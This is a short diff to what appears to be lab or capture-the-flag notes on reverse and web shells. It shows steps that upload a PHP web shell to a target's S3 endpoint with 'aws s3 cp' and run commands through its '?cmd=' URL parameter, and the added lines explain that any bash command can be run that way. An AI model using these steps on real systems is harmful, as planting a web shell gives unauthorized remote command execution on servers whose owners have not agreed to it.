@@ -17,6 +17,9 @@ Reverse shells are often used for gaining remote access to a system. Reverse she
 2. ```cat shell.php```: check for ```shell.php```
 3. ```aws s3 cp --endpoint-url=http://<target_url> shell.php s3://<target_url_w/o_extensions>```: upload ```shell.php``` to target
 4. go to web browser, enter URL ```http://<target_url>/shell.php?cmd=ls```: execute ```ls``` command in web browser
+    a. You should now have access to the target website and can execute ```bash``` commands through the URL.
+    b. Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.
+
 
 # Upgrade your shell
 #### Description
